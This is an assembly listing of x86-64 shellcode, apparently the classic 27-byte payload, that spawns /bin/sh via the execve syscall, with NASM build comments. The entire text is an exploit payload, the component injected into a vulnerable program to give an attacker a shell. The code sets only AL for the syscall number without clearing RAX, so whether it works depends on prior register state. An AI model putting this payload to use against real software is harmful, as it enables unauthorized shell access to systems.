; 27-byte execve("/bin/sh", NULL, NULL) shellcode
; NASM: nasm -f bin -o shellcode.bin shellcode.asm
; BITS 64

BITS 64

xor rsi, rsi          ; rsi = 0 (argv = NULL)
push rsi              ; null terminator for "/bin/sh"
mov rdi, 0x68732f6e69622f  ; "/bin/sh" in little-endian
push rdi
mov rdi, rsp          ; rdi -> "/bin/sh"
xor rdx, rdx          ; rdx = 0 (envp = NULL)
mov al, 59            ; execve syscall number
syscall
